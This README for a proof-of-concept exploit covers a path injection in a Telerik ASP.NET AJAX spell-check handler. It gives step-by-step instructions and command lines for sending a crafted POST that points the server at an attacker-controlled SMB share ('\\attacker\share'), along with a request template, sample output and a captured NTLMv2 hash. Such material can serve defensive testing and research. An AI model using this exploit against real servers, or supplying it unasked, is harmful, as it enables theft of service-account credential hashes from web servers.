# RadSpell DictionaryLanguage Path Traversal

Proof-of-concept for the SpellCheckHandler `DictionaryLanguage` UNC path injection (CVE-2026-13189) in Telerik UI for ASP.NET AJAX, fixed in 2026.2.708.

## Vulnerability

`SpellCheckHandlerNoSession` reads the `DictionaryLanguage` form field from the POST body and passes it to `SpellChecker` without validation. `SpellChecker.LoadDictionary()` combines it with `DictionaryPath` using `Path.Combine`:

```csharp
string text = Path.Combine(DictionaryPath, DictionaryLanguage + ".tdf");
```

When `DictionaryLanguage` is an absolute or UNC path, `Path.Combine` ignores `DictionaryPath` entirely and returns the attacker-controlled value. The server then tries to open the resulting `.tdf` file, which triggers an outbound SMB connection to the specified UNC path. This leaks the IIS application pool account's NTLMv2 hash to any SMB listener the adversary controls.

`Path.Combine` appends the `.tdf` extension, so the adversary cannot control the full filename. No `.tdf` file will exist at the UNC path, so arbitrary file read is not possible. But the SMB connection attempt happens before the file-not-found error, and that is enough to leak the NTLMv2 hash.

---

## Attack path

```
POST /Telerik.Web.UI.SpellCheckHandler.axd
  DictionaryLanguage=\\attacker\share
  Configuration=<harvested blob>
  CommandName=SpellCheck
  CommandArgument=test
    |
    v
SpellCheckHandlerNoSession.ProcessRequest()
  -> reads DictionaryLanguage from Request.Form         (no validation)
  -> reads Configuration from Request.Form
  -> DialogParameters.Deserialize(Configuration)        (decrypts the blob)
  -> CreateSpellChecker(DictionaryLanguage, params)
    -> new SpellChecker()
    -> SpellChecker.DictionaryLanguage = "\\attacker\share"
    -> SpellChecker.DictionaryPath = params.DictionaryPath  (e.g. ~/App_Data/RadSpell/)
    -> SpellChecker.CheckText("test")
      -> LoadDictionary()
        -> Path.Combine("C:\inetpub\...\App_Data\RadSpell\", "\\attacker\share.tdf")
           returns "\\attacker\share.tdf"               (absolute path wins)
        -> ReaderForFile("\\attacker\share.tdf")
          -> File.Exists("\\attacker\share.tdf")        (triggers SMB handshake)
          -> NTLMv2 hash sent to \\attacker
```

---

## Configuration blob

The `Configuration` parameter is an encrypted dialog-parameters blob that carries the `DictionaryPath` and handler settings. Telerik encrypts it with the `DialogParametersEncryptionKey` (or the default key if none is configured), but the exploit does not need to know the key. The exploit harvests the blob verbatim from any page that renders a RadEditor with spell check enabled.

On the page, the blob appears in one of two places:

1. The `spellCheckJSON.configuration` property in the RadEditor JSON initialiser.
2. A `set_spellCheckConfiguration()` call in the page script.

The handler accepts the blob as-is in the `Configuration` POST field. No MAC or replay protection exists on this parameter.

The POST also requires `CommandName=SpellCheck` and a non-empty `CommandArgument` (any string). Without both, the handler exits before reaching the spell checker.

## Prerequisites

- A page rendering `<telerik:RadEditor />` with the spell check tool enabled
- An SMB listener to capture the NTLMv2 hash (e.g. Impacket `smbserver.py` or Responder)
- Python 3.8+

## Usage

```bash
pip install -r requirements.txt

# Harvest the Configuration blob and send the UNC injection
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener '\\attacker\share'

# Supply the Configuration blob directly
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener '\\attacker\share' \
    --configuration 'BASE64_BLOB'

# Route through Burp
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener '\\attacker\share' \
    --proxy http://127.0.0.1:8080
```

Run your SMB listener before launching the exploit. The server will attempt to load `\\attacker\share.tdf`, initiating the NTLM handshake.

### Flags

| Flag | Default | Purpose |
|---|---|---|
| `base` (positional) | required | Target base URL |
| `--page` | required | Page with RadEditor and spell check |
| `--listener` | required | UNC path to your SMB listener |
| `--handler` | `Telerik.Web.UI.SpellCheckHandler.axd` | SpellCheck handler path |
| `--configuration` | | Supply the encrypted Configuration blob directly |
| `--proxy` | | HTTP proxy URL |
| `-v` | | Verbose output |

## How it works

1. GET the RadEditor page and extract the `SpellCheckSettings.Configuration` blob from the page HTML.
2. POST to `Telerik.Web.UI.SpellCheckHandler.axd` with `CommandName=SpellCheck`, a non-empty `CommandArgument`, the harvested `Configuration`, and `DictionaryLanguage` set to the attacker's UNC path.
3. The server calls `Path.Combine(DictionaryPath, "\\attacker\share.tdf")`, which returns the UNC path. The file-open attempt triggers an outbound SMB connection.
4. The SMB listener captures the NTLMv2 hash of the IIS worker process account.

## Expected output

```
[*] harvesting SpellCheck Configuration from /editor.aspx
[+] harvested Configuration (248 chars)
[*] sending SpellCheck request with DictionaryLanguage = \\attacker\share
[*] the server will attempt to load \\attacker\share.tdf from this path
[*] watch your listener for an inbound SMB connection
[*] HTTP 500 (1234 bytes)
[+] HTTP 500 -- the server tried to reach the UNC path and failed, which means
    the SMB handshake was attempted. Check your listener for the NTLMv2 hash.
```

On your SMB listener (Impacket `smbserver.py`):

```
[*] Incoming connection (10.0.0.1,49152)
[*] User WIN-SERVER\IIS_APPPOOL authenticated successfully
[*] NTLMv2-SSP Hash: IIS_APPPOOL::WIN-SERVER:aabbccdd...
```

## Files

| File | Description |
|---|---|
| `exploit.py` | Harvests the Configuration blob and sends the UNC injection payload. |
| `requirements.txt` | Python dependencies. |
| `Dockerfile` | Python 3.12-slim container. |

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## License

Released under the [MIT License](../../LICENSE).
